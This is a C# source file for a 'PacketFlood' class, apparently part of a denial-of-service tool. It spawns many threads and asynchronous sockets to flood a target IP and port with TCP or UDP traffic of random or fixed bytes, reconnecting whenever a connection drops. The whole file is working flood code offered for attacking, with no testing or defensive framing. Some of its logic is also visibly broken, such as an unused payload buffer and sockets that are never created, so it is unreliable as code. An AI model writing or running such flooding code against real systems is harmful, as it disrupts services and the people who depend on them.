using GAS.Core.Strings;
using SharpNeatLib.Maths;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace GAS.Core {
    public class PacketFlood : IAttacker {
        #region vars
        int SPT;
        int FloodCount;
        public bool Resp, AllowRandom, init = false;
        public string Data;
        private int Protocol;
        private Thread[] WorkingThreads;
        private static int BUFFER_SIZE = 50000;
        FastRandom RNG = new FastRandom();
        DataS[] flood_info;
        #endregion
        #region attack methods
        private void TCPAttack( IPEndPoint trg, DataS data ) {
            #region Connect handler
            data.Conn = new SocketAsyncEventArgs() {
                DisconnectReuseSocket = true,
                RemoteEndPoint = trg,
                SocketFlags = SocketFlags.None,
                UserToken = data
            };
            #endregion
            #region Sent handler
            data.Snd = new SocketAsyncEventArgs() {
                DisconnectReuseSocket = true,
                SocketFlags = SocketFlags.None,
                UserToken = data
            };
            #endregion
            #region attach handlers
            data.Snd.Completed += SND;
            data.Conn.Completed += CONNECTED;
            #endregion
            #region if random generate shit else use data field
            data.bytes = new byte[BUFFER_SIZE];
            if ( this.AllowRandom )
                RefreshBuffer(data);
            else {
                var buf = System.Text.Encoding.ASCII.GetBytes(Data);
            }
            #endregion
            //connect
            if ( !data.s.ConnectAsync(data.Conn) )
                SND(data.s, data.Snd);
        }
        private void UDPAttack( IPEndPoint trg, DataS data ) {
            #region send handler data
            data.Snd = new SocketAsyncEventArgs() {
                DisconnectReuseSocket = true,
                SocketFlags = SocketFlags.None,
                UserToken = data,
                RemoteEndPoint = trg
            };
            #endregion
            #region attach handlers
            data.Snd.Completed += _SND;
            #endregion
            #region if random generate shit else use data field
            data.bytes = new byte[BUFFER_SIZE];
            if ( this.AllowRandom )
                RefreshBuffer(data);
            else {
                var buf = System.Text.Encoding.ASCII.GetBytes(Data);
            }
            #endregion
            if ( !data.s.SendToAsync(data.Snd) )
                _SND(data, data.Snd);
        }
        #endregion
        void _SND( object _a, SocketAsyncEventArgs _b ) {
            try {
                DataS __data = (DataS)_a;
                //while attacking
                while ( this.IsFlooding ) {
                    this.Requested++;
                    //generate data if needed
                    if ( this.AllowRandom )
                        RefreshBuffer(__data);
                    if ( __data.s.SendToAsync(__data.Snd) )
                        return;
                }
            }
            catch { }
        }
        #region Constructor
        public PacketFlood( string ip, int port, int proto, int delay, bool resp, string data, bool random, int threadcount, int SocketsPerThread ) {
            this.ThreadCount = threadcount;
            WorkingThreads = new Thread[ThreadCount];
            this.Target = Dns.GetHostAddresses(ip)[0].ToString();
            this.Port = port;
            this.Protocol = proto;
            this.Delay = delay;
            this.Resp = resp;
            this.Data = data;
            this.AllowRandom = random;
            this.SPT = SocketsPerThread;

        }
        #endregion
        #region control
        public override void Start() {
            if ( IsFlooding )
                throw new InvalidOperationException("Attack already running");
            IsFlooding = true;
            flood_info = new DataS[SPT * ThreadCount];
            //create attack storage array
            for ( int i = 0; i < flood_info.Length; flood_info[i++] = new DataS() ) ;
            //start threads
            for ( int i = 0; i < ThreadCount; ( WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork)) ).Start(i++) ) ;
            init = true;
        }
        public override void Stop() {
            //stop flooding
            IsFlooding = false;
            if ( flood_info != null ) {
                foreach ( var flood in flood_info ) {
                    flood.s.Close();
                    //remove links to parent to prevent memleaks
                    flood.Snd.UserToken = null;
                    flood.Conn.UserToken = null;
                    //dispose sockets
                    flood.Conn.Dispose();
                    flood.Snd.Dispose();
                    flood.s.Dispose();
                    //feed gc
                    flood.bytes = null;
                    flood.Conn = null;
                    flood.s = null;
                    flood.Snd = null;
                }
            }
            flood_info = null;
        }
        #endregion
        #region helper data
        //attack data storage
        class DataS {
            public Socket s;
            public byte[] bytes;
            public SocketAsyncEventArgs Conn, Snd;
        }
        //thread wrapper
        private void bw_DoWork( object sender ) {
            while ( !init ) Thread.Sleep(100);
            try {
                IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(Target), Port);
                for ( int i = 0; i < SPT; i++ ) {
                    switch ( Protocol ) {
                        case 1:
                            TCPAttack(RHost, flood_info[(int)sender * SPT + i]);
                            break;
                        case 2:
                            UDPAttack(RHost, flood_info[(int)sender * SPT + i]);
                            break;
                    }
                }
            }
            catch { }
        }
        #endregion
        #region Async code
        /// <summary>
        /// Sent handler for tcpattack
        /// </summary>
        /// <param name="_a">Data with data</param>
        /// <param name="_b">SocketAsyncEventArgs</param>
        void SND( object _a, SocketAsyncEventArgs _b ) {
            DataS __data = (DataS)_a;
            try {
                //while attacking
                while ( this.IsFlooding ) {
                    this.Requested++;
                    //while connected send data
                    while ( this.IsFlooding && _b.SocketError == SocketError.Success && ( __data.s ).Connected ) {
                        //generate data if needed
                        if ( this.AllowRandom )
                            RefreshBuffer(__data);
                        if ( __data.s.SendAsync(__data.Snd) )
                            return;
                    }
                    //if disconnected && attacking => create new socket
                    if ( this.IsFlooding && !__data.s.Connected ) {
                        __data.s = CreateSocket(__data.s.ProtocolType);
                        ////data.Conn.UserToken = data;
                        ////data.Snd.UserToken = data;

                        //try connect async
                        //if async => exit function, CONNECTED will be invoked by event
                        //else continue looping
                        if ( __data.s.ConnectAsync(__data.Conn) )
                            return;
                    }
                }
            }
            catch { }
        }
        /// <summary>
        /// Socket.Connected handler
        /// </summary>
        /// <param name="_a">DataS with data</param>
        /// <param name="_b">SocketAsyncEventArgs</param>
        void CONNECTED( object _a, SocketAsyncEventArgs _b ) {
            DataS __data = (DataS)_a;
            try {
                //main attack event loop
                if ( this.IsFlooding ) {
                    //while not connected
                    while ( _b.SocketError != SocketError.Success || !__data.s.Connected )
                        //if async => exit function, SND will be invoked by event
                        //else try to send data
                        if ( this.IsFlooding )
                            if ( ( __data.s ).ConnectAsync(__data.Conn) )
                                return;
                    //try to send data async. 
                    //if async => exit function, SND will be invoked by event
                    //else invoke SND
                    if ( this.IsFlooding )
                        if ( !__data.s.SendAsync(__data.Snd) )
                            SND(_a, __data.Snd);
                }
            }
            catch { }
        }
        /// <summary>
        /// recreate socket
        /// </summary>
        /// <param name="_type"></param>
        /// <returns></returns>
        Socket CreateSocket( ProtocolType _type ) {
            return new Socket(AddressFamily.InterNetwork, SocketType.Dgram, _type) {
                Blocking = false
            };
        }
        /// <summary>
        /// Fill buffer with random bytes
        /// </summary>
        /// <param name="_data"></param>
        void RefreshBuffer( DataS _data ) {
            //fill buffer with random
            this.RNG.NextBytes(_data.bytes);
            //set buffer as default send data
            _data.Snd.SetBuffer(_data.bytes, 0, _data.bytes.Length);
        }
        #endregion
    }
}